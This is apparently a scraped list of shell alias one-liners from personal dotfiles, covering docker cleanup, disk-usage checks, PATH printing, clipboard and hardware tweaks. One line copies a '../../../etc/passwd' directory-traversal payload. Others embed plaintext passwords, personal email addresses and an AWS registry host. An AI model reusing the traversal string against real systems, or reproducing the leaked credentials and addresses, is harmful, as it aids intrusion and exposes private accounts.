"echo ""961517735772.dkr.ecr.us-east-1.amazonaws.com"" | pbcopy"
"echo ""90"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""80"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""70"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""7"" | sudo apachectl restart"
"echo ""7"" | sudo -S cp /etc/hosts_remote /etc/hosts"
"echo ""7"" | sudo -S cp /etc/hosts_local /etc/hosts"
"echo ""60"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""500"" | sudo tee /sys/class/backlight/intel_backlight/brightness"
"echo ""50"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""44mF4vzD@&Lv^dgk&U8r*u\$mZuaI\n`onelogin_print_2fa`"" | onelogin_login"
"echo ""40"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""4*a(1)"" | bc -l"
"echo ""4"" | sudo gmabooster"
"echo ""37"" | awk -f ~/switch.awk"
"echo ""36"" | awk -f ~/switch.awk"
"echo ""30"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""212857"" | pbcopy && pbpaste"
"echo ""1700"" | sudo tee /sys/class/backlight/intel_backlight/brightness"
"echo ""100"" | sudo tee /sys/devices/system/cpu/intel_pstate/max_perf_pct"
"echo ""10"" >> ~/.time_saved.txt; git ls-tree -r --name-only HEAD | grep --color $1"
"echo ""1"" | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo"
"echo ""1"" | sudo -S mysoft/rj/rjsupplicant.sh &"
"echo ""0"" | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo"
"echo ""0"" | sudo tee -a /sys/devices/platform/asus-nb-wmi/leds/asus::kbd_backlight/brightness > /dev/null"
"echo ""../../../../../../../../../../../etc/passwd"" | xsel -b; echo ""Copied!"""
"echo ""-over"" | xargs wn"
"echo ""-XX:MaxPermSize=512m -Xmx1g""| pbcopy; echo ""-XX:MaxPermSize=512m -Xmx1g"""
"echo ""->"" | grep -rn --color --"
"echo ""---FIRST---:$PATH:---LAST---"" | tr : ""\n"""
"echo ""--------- Synced on $(date) --------"" | tee -a $MDIR_LOGS/inotify/drive/log $MDIR_LOGS/inotify/drive/log2"
"echo ""(ノಠ益ಠ)ノ彡┻━┻"" | pbcopy"
"echo ""(╯°□°）╯︵ ┻━┻"" | pbcopy"
"echo ""(╯°□°)╯︵ ┻━┻"" | pbcopy; echo ""(╯°□°)╯︵ ┻━┻"""
"echo ""(now you can use !2008 to repeat command #2008)"";history | grep --color=auto"
"echo ""(make-frame-on-display \""$DISPLAY\"")"" | gnudoit"
"echo ""(`date ""+%s""`-`date -d ""2016-12-12"" ""+%s""`)/(60*60*24)""|bc"
"echo ""%s/\s\+$/"" | clipboard"
"echo ""${ps_title}""; ps | egrep -i"
"echo ""${PWD##*/}"" | xargs tmux rename-window"
"echo ""${PATH}"" | sed ""s/:/\\n/g"""
"echo ""${INITIALS} `date +""%F %H:%M %Z""` <-- On clipboard""; echo ""${INITIALS} `date +""%F %H:%M %Z""`"" |pbcopy"
"echo ""$TAG"" | xargs -L 1 -i mv {} ."
"echo ""$TAG"" | xargs -L 1 -i cp {} ."
"echo ""$SHELLOPTS:$BASHOPTS"" | tr "":"" ""\n"""
"echo ""$PWD"" | xclip"
"echo ""$PWD"" | pbcopy"
"echo ""$PATH"" | tr : \\n"
"echo ""$PATH"" | tr -s "":"" ""\n"""
"echo ""$PATH"" | tr "":"" ""\n"""
"echo ""$PATH"" | sed -e ""s/:/\n/g"""
"echo ""$PATH"" | sed ""s/:/\n/g"""
"echo ""$CMD"" | /usr/sbin/cli > /var/tmp/cmdoutput.tmp; cat /var/tmp/cmdoutput.tmp"
"echo ""$CLASSPATH:$(echo $(find ${PWD}/../*/dist -name *.jar) | sed ""s/\s\+/:/g"")"""
"echo ""$@"" | qrencode -m 3 -t UTF8 -o -"
"echo ""$@"" | curl -s -F ""f:1=<-"" http://ix.io"
"echo ""$1"" | espeak -v english-us -s 120 2>/dev/null"
"echo ""$1"" | espeak -s 140 2>/dev/null"
"echo ""$1"" | espeak -s 120 2>/dev/null"
"echo ""$*"" | espeak -s 120 2>/dev/null"
"echo ""$(tput setaf 1)Folders in directory:$(tput setaf 4)"";ls -d */ | cut -f1 -d"
"echo ""$(tmux display -pt ""${TMUX_PANE:?}"" ""#{pane_index}"") - 1"" | bc"
"echo ""$(pwd)"" | pbcopy"
"echo ""$(ls -1 | wc -l)"""
"echo ""$(ls -1 $* | wc -l) files"""
"echo ""$(g_curbr)"" | xargs git push origin"
"echo ""$(fc -ln -1)"" | tr "
"echo ""$(fc -ln -1)"" | sed ""s/^. *//"""
"echo ""$(fc -ln -1)"" | sed ""s/^. *//"" >> $DOT/bash_aliases"
"echo ""$(current_branch)"" | pbcopy"
"echo ""$(curl https://api.kanye.rest/\?format\=text -s)\n-Kanye"" | cowsay"
"echo ""$(clippaste | wc -l) lines on clipboard"""
"echo ""$(clear)Running zsh as $(whoami)\n$(pwd)""; ll -AFG | less"
"echo ""$(acpi -t | awk ""{ print \$4 }"")°C"""
"echo ""$(($(ps -e -orss= | paste -sd+)))"""
"echo ""#include <sys/types.h>"" | gcc -E -x c -"
"echo ""#1f1f1f,#303030,#21859c,#FFFFFF,#303030,#FFFFFF,#85d14b,#DB6668"" | xclip -selection clipboard; echo ""copied!"""
"echo ""#1f1f1f,#303030,#21859c,#FFFFFF,#303030,#FFFFFF,#85d14b,#DB6668"" | pbcopy; echo ""copied!"""
"echo ""#1f1f1f,#303030,#21859c,#FFFFFF,#303030,#FFFFFF,#85d14b,#DB6668"" | clipboard; echo ""copied!"""
"echo ""#"" >> ~/.commands.sh && history -d $((HISTCMD-1)) && fc -nl $((HISTCMD - 1)) | sed \"
"echo ""#"" >> ~/.commands.sh && fc -nl $((HISTCMD - 1)) | sed \"
"echo ""#!/usr/bin/env bash""|pbcopy;echo ""#!/usr/bin/env bash"""
"echo ""# -*- viewing: Creeps -*- #""; fb FONLINE | less"
"echo """";svn status | grep -v swp"
"echo """"; echo ""*** LIST OF ALL PSNL SSH PROCESSES (REGARDLESS of DMF): ***""; echo """"; echo ""$(ps | grep -i ssh) """
"echo """" | pbcopy"
"echo """" | openssl s_client -connect "
"echo """" | nc -q 1 -u plebis.net 7777"
"echo """" | mutt odontomachus@gmail.com"
"echo """" | mail -s ""Server: $(hostname -s) $(date) Job Finished. Enjoy!"" sbhal@qti.qualcomm.com"
"echo """" > $(php --ini | grep xdebug)"
"echo """" ; df -h ~ | sed /""export""/d ; echo """""
"echo """" ; df -h | grep -e /dev/ -e Filesystem ; echo """" "
"echo """" && neofetch --ascii_distro linux --color_blocks off && i3 -v|cut -d"" "" -f -6"
"echo ""!squashfs"" && lsblk --fs | grep -v squashfs"
"echo ""![](https://cloud.githubusercontent.com/assets/1674699/4883145/3fd1640a-635f-11e4-87c5-902706e24727.png)![](https://cloud.githubusercontent.com/assets/1674699/4923944/d6e58bda-651e-11e4-82a0-90ce68a4357c.png)"" | pbcopy"
"echo "" PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND"" ; top -bn1 | grep "
"echo "" "" | mail -a coherence{_1,_2,_3,_4}* -s coherence_files ${NOTIFICATIONEMAIL} ; echo ""coherence file sent to <${NOTIFICATIONEMAIL}>"""
"echo "" "" | mail -a *.kmz -s PySAR_kmz_file ${NOTIFICATIONEMAIL} ; echo ""kmz file sent to <${NOTIFICATIONEMAIL}>"""
"echo "" "" | mail -a *.kml -s ssara_kml_file ${NOTIFICATIONEMAIL} ; echo ""kml file sent to <${NOTIFICATIONEMAIL}>"""
"ec ""${(F)commands}""|ag_c=0 agm"
"eachdir ""npm owner ls 2>/dev/null | sort"""
"e_header ""Clearing ./Web/typo3temp/*""; ds -c ""echo removing \`find ./Web/typo3temp/ -type f | wc -l\` files; rm -rf ./Web/typo3temp/*""; e_success Done"
"du . | grep -E ""^[0-9]+(\s)*\.\/[a-zA-Z0-9\_=\ \.\-]*$"""
"du -shx . .. err.txt generated.file succ.txt --exclude=""."" --exclude="".."" | grep ""^[0-9.]*[MG]"""
"du -shx err.txt generated.file succ.txt | grep -w ""[0-9]*G"""
"du -sh *|egrep "".*\.?[0-9]M"""
"du -sh err.txt generated.file succ.txt | sort -k1,1rh"
"du -sh err.txt generated.file succ.txt | grep -e ""^[0-9,]\+G"""
"du -sh err.txt generated.file succ.txt | grep ""[0-9][MG]"""
"du -sh err.txt generated.file succ.txt | ""$SORT"" -h"
"du -sh err.txt generated.file succ.txt 2>/dev/null | grep -E ""[0-9]+(\.[0-9])?G.*"""
"du -sh $(pwd) && echo """" && for i in $(ls) ; do du -sh ""$(pwd)/$i"" ; done | sort -hr "
"du -sckx err.txt generated.file succ.txt | sort -nr"" # directories sorted by size"
"du -s err.txt generated.file succ.txt | grep \""^[0-9]\{$1\}\"""
"du -s err.txt generated.file succ.txt | grep ""^[0-9]\{7\}"""
"du -s err.txt generated.file succ.txt | grep ""^[0-9]\{4\}"""
"du -s err.txt generated.file succ.txt | grep ""^[0-9]\{1\}"""
"du -s err.txt generated.file succ.txt | grep ""^[0-9]\{10\}"""
"du -s err.txt generated.file succ.txt "".[a-zA-Z]*"" | sort -n"
"du -m | grep -v ""\/.*\/"""
"du -k ~/ | sort -n ; echo "" "" ; quota -v"
"du -k | grep -v ""\/.*\/"""
"du -h|grep '[0-9]\{2,3\}K[[:space:]]'"
"du -h|grep '[0-9]\{1,4\}G[[:space:]]'"
"du -hs {.,}* | sort -h"
"du -hs err.txt generated.file succ.txt | grep ""[4-9]\{2\}M"""
"du -hs err.txt generated.file succ.txt | grep ""[1-9]\{3\}M"""
"du -hs err.txt generated.file succ.txt | grep ""[1-9]\{2\}M"""
"du -hcs ./{*(N),.*(N)} | sort -hr"
"du -hc -d 1 | sort -k1,1h"
"du -h ~/ | grep ""^[0-9]*.[0-9]G"""
"du -h / | grep ""[0-9\.]\+G"""
"du -h . | grep '[0-9\,]\+G'"
"du -h . | grep ""^[0-9\.]\+G"""
"du -h -d1 | sort -hk1,1"
"du -h -d 2 |grep ""G\t"""
"du -h -d 1 | grep ""[0-9]M"""
"du -h -d 1 | grep ""[0-9]G"""
"du -h --max-depth=1|grep -vE ""^[0-9.]{1,3}K"""
"du -h --max-depth=1 ""$@"" | sort -k 1,1hr -k 2,2f"
"du -h --exclude=""*.git*"" | sort -h"
"du -h err.txt generated.file succ.txt | perl -ne'print if m,\t[^/]+$,'"
"du -cha | grep ""[0-9]G[ ]"""
"du -ch | grep ""G\s"""
"du -ch , | grep total"
"du -cBM -d1 2> >(grep -v ""Permission denied"") | sort -n"
"du -ach --max-depth=1 2> >(grep -v ""^du: cannot \(access\|read\)"" >&2)"
"du -I Music -I Volumes -hcm | awk -F "" "" "
"du --max-depth=0 -kc -a err.txt generated.file succ.txt | sort && echo "" "" "
"du --block-size=MiB --max-depth=1 --exclude=""\./\.*"" | sort -nr"
"dts=$(date +""%Y-%m-%d_%H.%M.%S"");seq 1 49 | xargs -I{} date;echo Just a spacer __ $dts \_\_ -=-=-=-=-=-=-=-=-=-=-=-"
"dts=$(date +""%Y-%m-%d_%H.%M.%S""); seq 1 49 | xargs -I{} date ; echo Just the spacer only __ $dts -=-=-=-=-=-=-=-=-=-=-=-"
"dtach -a $(ls -t `find ~ -name ""*.dtach""` | head -1) -z"
"dsh --file ~/.dsh/mod18 -M -r ssh -Mc -- ""tail -F /iad/finn/user/logs/misc/normal.gc.log | grep --line-buffered Full"""
"dsh --file ~/.dsh/alertserver -M -r ssh -Mc -- ""tail -F /iad/finn/search-alertserver/logs/search-alertserver.log | grep --line-buffered monitor"""
"dscl . list /users | grep -v ""_"""
"dscl . list /groups | grep -v ""_"""
"ds ""*"" --json --detail | json_to_csv"
"drush uli | sed -e ""s/^.*user/user/g"""
"drush solr-delete-index | drush solr-index && terminal-notifier -message ""Solr re-indexed"""
"dpkg-query -Wf ""${Installed-Size}\t${Package}\n"" | sort -n"
"dpkg-query -W -f=""\${Installed-Size}\t\${binary:Package}\n"" | sort -n"
"dpkg-query -W --showformat='${Installed-Size;10}\t${Package}\n' | sort -k1,1n"
"dpkg-query -W --showformat=""\${Installed-Size}\t\${Package}\n"" | sort -nr"
"dpkg-query -W --showformat=""\${Installed-Size;10}\t\${Package}\n""|sort -k1,1n"
"dpkg-query -W --showformat=""\${Installed-Size;10}\t\${Package}\n"" | sort -k1,1n"
"dotcfg ls-files -v | grep ""^[[:lower:]]"""
"dotcfg log -n 1 | grep -q -c ""\-\-wip\-\-"" && dotcfg reset HEAD~1"
"doing yesterday --totals | colout '^([ \d:apm]+) ?([>:]) (.*)' green,black,white"
"doing today --totals | colout '^([ \d:apm]+) ?([>:]) (.*)' green,black,white"
"doctl compute droplet list --format Name,PublicIPv4,Tags --no-header | grep -E ""[^,]edirectory$"""
"dockps | (read h; echo ""$h""; sort -k3)"
"dockps | (read h; echo ""$h""; LC_ALL=C sort -s -k2 -b)"
"docker-compose logs -f nginx | grep -e ""GET /userlocation"" -e ""GET /geofence"""
"docker volume rm \$(docker volume ls -q | awk -F, 'length(\$0) == 64 { print }')"
"docker volume rm $(docker volume ls |awk ""{print $2}"")"
"docker volume rm $(docker volume ls -qf dangling=true | grep "".\{64\}"")"
"docker volume ls -q | xargs docker volume rm"" # docker gc volumes"
"docker volume ls -f ""dangling=true"" -q | xargs docker volume rm:"
"docker volume ls -f ""dangling=true"" -q | xargs docker volume rm"
"docker volume ls --format ""{{.Name}}"" | xargs docker volume rm"
"docker volume list | docker volume rm $(awk ""{print \$2}"")"
"docker run -v $HOME:/hosthome:ro -e XAUTHORITY=/hosthome/.Xauthority -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27x:/"")"
"docker run -v $HOME:/hosthome:ro -e XAUTHORITY=/hosthome/.Xauthority -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run -v $HOME:/hosthome:ro -e XAUTHORITY=/hosthome/.Xauthority -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/$(hostname -i):/"")"
"docker run -v $HOME:/hosthome:ro -e XAUTHORITY=/hosthome/.Xauthority --privileged -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run -ti --rm -p 8008:8008 --name math-user-temp -v $(pwd):/tmp --workdir /tmp $(docker images --format ""table {{.Repository}}:{{.Tag}}"" | fzf)"
"docker run -it -p 7800:7800 -p 7100:7100 -m 8192M --memory-reservation 6144M -e VAULT_TOKEN=""$(cat ~/.vault-token | awk "
"docker run --rm -p 8008:8008 --name math-user-temp -v $(pwd):/tmp --workdir /tmp $(docker images --format ""table {{.Repository}}:{{.Tag}}"" | fzf)"
"docker run --privileged=true -v /tmp/.X11-unix:/tmp/.X11-unix:ro -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run --privileged-v /tmp/.X11-unix:/tmp/.X11-unix:ro -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run --privileged -u docker -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run --privileged -u charles -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker run --privileged -e DISPLAY=$(echo $DISPLAY | sed ""s/^.*:/192.168.2.27:/"")"
"docker rmi -f $(docker images | awk ""{print \$3}"")"
"docker rmi -f $(docker images | awk ""/ / { print $3 }"")"
"docker rmi $(docker images | awk ""/^<none>/ {print $3}"")"
"docker rmi $(docker images -a| awk ""/^<none>/ { print $3 }"")"
"docker rm `docker ps -a -q` && docker rmi $(docker images | awk ""/^<none>/ { print $3 }"")"
"docker rm `docker ps --no-trunc -aq` && docker images -q --filter ""dangling=true"" | xargs docker rmi"
"docker rm -f $(docker ps -a -q) && docker volume rm $(docker volume ls -qf dangling=true) && docker rmi `docker images -q` && docker images -q --filter ""dangling=true"" | xargs -n 100 docker rmi"
"docker rm --force `docker ps -a --format=""{{ .Names }}"" | grep ""_""`"
"docker rm $(docker ps -q -a | tr ""\n"" "" "")"
"docker rm $(docker ps -a -q -f status=exited) && docker images -q --filter ""dangling=true"" | xargs docker rmi"
"docker ps | awk -F "" {2,}"" ""{print $7}"""
"docker ps -qa | each ""docker stop"" ""docker rm"""
"docker ps -q |xargs docker inspect --format '{{.Name}} : {{range .NetworkSettings.Networks}}{{.IPAddress}}, {{end}}'"
"docker ps -q | xargs docker stop ;\
"docker ps -q | xargs docker inspect --format '{{ .Id }} - \
"docker ps -q | xargs \
"docker ps -q | xargs -L1 -IA docker inspect A --format ""{{range .Config.Env}}{{$.Name}} {{println .}}{{end}}"""
"docker ps -q | while read cid; do echo > $(docker inspect --format=""{{.LogPath}}"" $cid); done"
"docker ps -n15 -a --format ""table {{.RunningFor}}\\t{{.Status}}\\t{{.Command}}\\t{{.Names}}"" | cut -c -140"
"docker ps -n15 --format ""table {{.RunningFor}}\\t{{.Status}}\\t{{.Command}}\\t{{.Names}}"" | cut -c -140"
"docker ps -f 'status=exited' -q | xargs docker rm"" # docker gc containers"
"docker ps -f ""status=exited"" -q | xargs docker rm"
"docker ps -aqf 'status=exited' | xargs --no-run-if-empty docker rm -v && \
"docker ps -aqf ""status=exited"" -f ""status=created"" | xargs docker rm"
"docker ps -aq | xargs -P $(nproc) -n1 docker rm -f ; docker rmi $(docker images --filter ""dangling=true"" -q --no-trunc)"
"docker ps -aq -f ""status=exited"" | xargs --no-run-if-empty docker rm -v -f"
"docker ps -a -q | xargs docker stop \
"docker ps -a -q | \
"docker ps -a -q --filter=""status=exited"" | xargs docker rm"
"docker ps -a -q --filter=""status=created"" | xargs docker rm"
"docker ps -a -f ""status=exited"" -q | xargs docker start"
"docker ps -a -f ""status=exited"" -f ""status=dead"" --format ""{{.ID}}"" | xargs docker rm"
"docker ps -a --format=""table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"" | sed "
"docker ps -a --format ""{{json .}}"" | jq"
"docker ps -a --format ""{{.ID}}\t{{.Status}}"" | grep -v "
"docker ps -a --format ""{{.ID}}"" | xargs docker rm -v"
"docker ps -a --format ""{{.ID}}"" | xargs docker rm -fv"
"docker ps -a --format ""{{.ID}} {{.Names}}|{{.Image}} → {{.Status}}"""
"docker ps -a --format ""{{ .ID }} {{ .Names }} {{ .RunningFor }} {{ .Image }}"" | column -t"
"docker ps -a --format ""table{{ .Names }}\\t{{ .ID }}\\t{{ .Image }}\\t{{ .Status }}\\t{{ .Ports }}\\t{{ .Command }}\\t{{ .CreatedAt }}"" | cut -c-$(tput cols)"
"docker ps -a --format ""table {{.Names}}\t{{.Status}}\t{{.RunningFor}}\t{{.Ports}}\t{{.Image}}\t{{.ID}}"" | sort"
"docker ps -a --format ""table {{.Names}}\t{{.Status}}"" | (read -r; printf ""%s\n"" ""$REPLY""; sort -k 1 )"
"docker ps -a --format ""table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{ .Ports }}\\t{{.RunningFor}}\\t{{.Command}}\\t{{ .ID }}"" | cut -c-$(tput cols)"
"docker ps -a --format ""table {{.ID}}\t{{.Names}}\t{{.Size}}\t{{.Status}}"" | grep -v CONTAINER"
"docker ps --quiet --filter ""status=exited"" | xargs docker rm"
"docker ps --format ""{{json .}}"" | jq"
"docker ps --format ""{{.Names}};{{.Image}};{{.Ports}}"" | column -ts "";"""
"docker ps --format ""{{.ID}}"" | xargs docker kill"
"docker ps --format ""{{.ID}}"" | xargs docker inspect -f ""{{.Name}} --- {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"""
"docker ps --format ""{{.ID}}"" | xargs -n 1 docker stop"
"docker ps --format ""{{.ID}}"" | xargs -I{} -n1 docker logs -f {}"
"docker ps --format ""{{ .Names }}"" | xargs docker stats"
"docker ps --format ""table {{.Names}}\t{{.Status}}"" | (read -r; printf ""%s\n"" ""$REPLY""; sort -k 1 )"
"docker ps --format ""table {{.Names}}\t{{.Mounts}}"" | sort"
"docker ps --format ""table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}"" -a | (read -r; printf ""%s\\n"" ""$REPLY""; sort)"
"docker ps --format ""table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{ .Ports }}\\t{{.RunningFor}}\\t{{.Command}}\\t{{ .ID }}"" | cut -c-$(tput cols)"
"docker ps --format ""table {{.ID}}\t{{.Status}}\t{{.Image}}"" | grep -v pause"
"docker ps --filter ""status=exited"" -q | xargs docker rm"
"docker ps --filter ""status=exited"" -q --no-trunc | xargs --no-run-if-empty docker rm"
"docker ps --filter ""status=exited"" -a -q | xargs docker rm -v"
"docker port $(docker ps -lq) | cut -d "" "" -f3"
"docker logs `docker ps -a --format ""{{.ID}}"" | head -n 1`"
"docker inspect dlv-nginx | grep ""IPAddress"""
"docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}}({{.Config.Image}}) {{json .NetworkSettings.Ports}}' \$(docker ps -q) | awk '{gsub(/172/, \"
"docker inspect --format ""{{ .NetworkSettings.Networks.bridge.IPAddress }} - {{ .Name }}"" $(docker ps -q) | grep"
"docker inspect $(docker ps -q) | awk ""/Pid/{print int(\$2)}"""
"docker inspect $(docker ps -l -q) | jq -r "".[0].NetworkSettings.IPAddress"""
"docker inspect $(docker ps --filter name=mongodb-tprod -q) | grep "" \""IPAddress\"":"""
"docker inspect $(docker ps --filter name=mongodb-tdev -q) | grep "" \""IPAddress\"":"""
"docker inspect $(docker ps --filter name=mongodb-bmprod -q) | grep "" \""IPAddress\"":"""
"docker inspect $(docker ps --filter name=mongodb-bmdev -q) | grep "" \""IPAddress\"":"""
"docker info --format=""{{json .}}"" | jq ""."""
"docker info --format ""{{json .}}"" | jq ."
"docker images | grep ""^<none>"""
"docker images | grep ""<none>"""
"docker images dangling=true --format ""{{ .ID }}"" | xargs -r docker rmi -f"
"docker images -q -f ""dangling=true"" | xargs docker rmi"
"docker images -q --filter=""dangling=true"" | xargs -r docker rmi"
"docker images -q --filter ""dangling=true"" | xargs sudo docker rmi"
"docker images -q --filter ""dangling=true"" | xargs docker rmi"
"docker images -q --filter ""dangling=true"" | xargs docker rmi > /dev/null 2>&1"
"docker images -q --filter ""dangling=true"" | xargs docker rmi -f"
"docker images -q --filter ""dangling=true"" | xargs -n1 docker rmi"
"docker images -q --filter ""dangling=true"" | xargs -P8 docker rmi"
"docker images -f dangling=true -q | xargs docker rmi"" # docker gc images"
"docker images -f ""dangling=true"" -q | xargs docker rmi"
"docker images -f ""dangling=true"" -q | xargs docker rmi && docker images"
"docker images -f ""dangling=true"" -q | xargs -r docker rmi"
"docker images -f ""dangling=true"" -q | xargs --no-run-if-empty docker rmi -f"
"docker images -f ""dangling=true"" --format ""{{.ID}}"" | xargs docker rmi"
"docker images -aq -f ""dangling=true"" | xargs --no-run-if-empty docker rmi"
"docker images --quiet --filter ""dangling=true"" | xargs docker rmi"
"docker images --format ""{{json .}}"" | jq"
"docker images --format ""{{.Size}}\t{{.Repository}}:{{.Tag}}\t{{.ID}}"" | sort -h"
"docker images --format ""{{.Repository}}:{{.Tag}}"" | xargs -L1 docker pull;"
"docker images --format ""{{.Repository}}:{{.Tag}}"" | xargs -L1 docker pull"
"docker images --format ""{{.Repository}}:{{.Tag}}"" | grep "
"docker images --format ""{{.Repository}}:{{.Tag}}"" | fzf"
"docker images --format ""{{.Repository}}"" | xargs -L1 docker pull"
"docker images --format ""{{ .Repository }} / {{ .Tag }} // {{ .Size }}"" | LANG=C sort"
"docker images --format ""table{{ .Repository }}\\t{{ .Tag }}\\t{{ .ID }}\\t{{ .Size }}\\t{{ .CreatedAt }}"" | cut -c-$(tput cols)"
"docker images --filter ""dangling=true"" -q | xargs docker rmi"
"docker images --filter ""dangling=true"" -q --no-trunc | xargs --no-run-if-empty docker rmi"
"docker images --filter ""dangling=true"" --quiet | xargs docker rmi"
"docker image ls -a --format ""{{.ID}}"" | xargs docker image rm"
"docker image ls --format ""table {{.Repository}}\t{{.Tag}}\t{{.ID}}"" | sort"
"docker exec -ti zabbix-db bash -c ""mysqldump -u zabbix -pASDewq123 zabbix | bzip2 -cq9 > /backups/zabbix_db_dump_$(date +%Y-%m-%d-%H.%M.%S).sql.bz2"""
"docker exec -it `docker ps --format ""{{.Names}}"" | peco` sh"
"docker container ls -a --format ""{{.ID}}"" | xargs docker container rm -f"
"docker container inspect `docker ps -a --format ""{{.ID}}"" | head -n 1`"
"docker build -t ${DNAME} . ; echo ""docker build -t ${DNAME}""; docker images | grep ${DNAME}"
"dock ps -aq | tr ""\n"" "" "" "
"dmysqlimport() { if [ $# != 5 ] ; then echo ""USAGE: $0 docker_name_or_pid mysql_username mysql_password mysql_dbname mysql_dbdump_file"" ; else ; cat ""$5"" | sudo docker exec -i ""$1"" /usr/bin/mysql -u$2 -p$3 ""$4"" ; fi }; dmysqlimport"
"dmesg|perl -ne ""BEGIN{\$a= time()- qx!cat /proc/uptime!};s/\[\s*(\d+)\.\d+\]/localtime(\$1 + \$a)/e; print \$_;"""
"dmesg | grep ""\[sd.\]"""
"dmesg | curl -F ""f:1=<-"" ix.io"
"diskutil umount /Volumes/tsp* |
"diskutil info / | grep ""Volume Available Space"""
"diskutil info / | grep ""Free Space"""
"discus|grep -v ""0 KB"""
"dirs | tr "" "" ""\n"""
"dirs | sed ""s/\ /\n/g"""
"dirs -v| head; echo -n ""select number: ""; read newdir; cd +""$newdir"""
"dirs -vl | ""$FuzzyFinder"""
"dirs -v | sed ""s;$my_projects;;g"""
"dirs -v | sed ""s/^/+/"""
"dirs -v | grep -v ""^0"""
"dirs -v | grep -v ""^ 0"""
"dir=`echo \`pwd\`|sed ""s@\($DEV_ROOT\)\(.*\)@\1/build\2@""`; cd $dir"
"dir=`echo \`pwd\`|sed ""s@\($DEV_ROOT\)/build\(.*\)@\1\2@""`; cd $dir"
"dir=$(find ~/Dropbox/ia -type d | fzf) && cd ""$dir"""
"dir=""$(fd -t d | fzf --height=20%)""; [ -d ""$dir""] && cd ""$dir"""
"dinspect | jq "".[0].Config.Cmd"""
"dig archlinux.org | grep ""Query time"""
"dig TXT +short o-o.myaddr.l.google.com |sed ""s/\""//g"""
"dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"""
"dig -6 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"""
"dig -6 TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed s/\""//g"
"dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"""
"dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed -e ""s_\\\""\\(.*\\)\\\""_\\1_g"" `# DNS based local IP lookup from google`"
"diffstat -s | awk -F, '{ gsub(/[^0-9,]/, \"
"diff-so-fancy | less --tabs=1,5 -RFX"
"diff <(lsvirtualenv) <(tmux list-sessions | cut -d "":"" -f 2)"
"diff <(ls) <(sed -nE ""s/\[(.*)\]/\1/p"" .mrconfig | sort)"
"diff -r $CONF_DIR/conf/ ~/ | grep -v ""Only in /home/alex*"""
"df -h|grep ""^/dev/"""
"df -ha |\
"df -h |\
"df -h | grep sd \
"df -h | grep -e ""/dev/sd"" -e ""Filesystem"" --color=never"
"df -h | grep ""/dev/"""
"df -h | grep ""/$"""
"df -Phl --total -x tmpfs -x devtmpfs | awk '{if(NR==1){title=\$0}else if(match(\$1,/^\//)){a[\$NF]=\$0}}END{PROCINFO[\"
"df -H | grep -v ""/snap"""
"df -H | grep ""/dev/"""
"df -H -l | awk -F"" "" "
"defaults write com.apple.finder CreateDesktop true; killall Finder | echo ""Showing desktop icons."""
"defaults write com.apple.finder CreateDesktop false; killall Finder | echo ""Hiding desktop icons."""
"defaults write com.apple.finder AppleShowAllFiles YES; killall Finder /System/Library/CoreServices/Finder.app | echo ""Showing hidden files."""
"defaults write com.apple.finder AppleShowAllFiles NO; killall Finder /System/Library/CoreServices/Finder.app | echo ""Hidding hidden files."""
"defaults domains | tr -s ', ' '\n'"
"defaults domains | tr ',' '\n'"
"defaults domains | sed ""s:, :\\`echo -e ""\n\r""`:g"""
"declare -f | grep ""{$"""
"declare -F | egrep -v ""^declare -f _"""
"declare -F | cut -f3 -d"" """
"declare -F | cut -d ""="" -f2- "
"declare -F | cut -d "" "" -f 3"
"declare -F | awk ""\$3 ~ /^[^_]/ { print \$3}"""
"deactivate | printf ""\n"" && . $THIS"
"deactivate | printf ""\n"" && "". aci_env"
"dd if=/dev/random bs=1 count=64 2>/dev/null | tr -dc ""[:alpha:]"""
"dcop `echo $KONSOLE_DCOP_SESSION | sed 's/.*(\(.*\),\(.*\).*)/\1 \2/'` setSize"
"dck images -q --filter ""dangling=true"" | xargs sudo docker rmi -f"
"dblogin && echo ""select err.txt generated.file succ.txt from game"" | psql -h DB.ap-southeast-2.rds.amazonaws.com -U mathgame mathgame"
"date_str=$(date +%Y%m%d_%T) && tmp_file_name=svn_diff_$date_str && svnaw |xargs \
"date | sed ""s/ /_/g"""
"date ; ls -lt | grep ""drwx*"""
"date -u +""%d-%m-%Y (24-hrs: %T | 12-hrs: %r)"""
"date -u +""%Y-%m-%d %H:%M:%S.000000"" | pbcopy; pbpaste"
"date -j -f ""%a %b %d %T %Z %Y"" ""`date`"" ""+%s"" | pbcopy"
"date -I | sed ""s/-//g"""
"date --rfc-3339=seconds | tr "" "" T"
"date --rfc-3339=seconds | tr "" "" ""T"""
"date --iso-8601=minutes | sed ""s/://g"""
"date --help | sed -n ""/^FORMAT/,/%Z/p"""
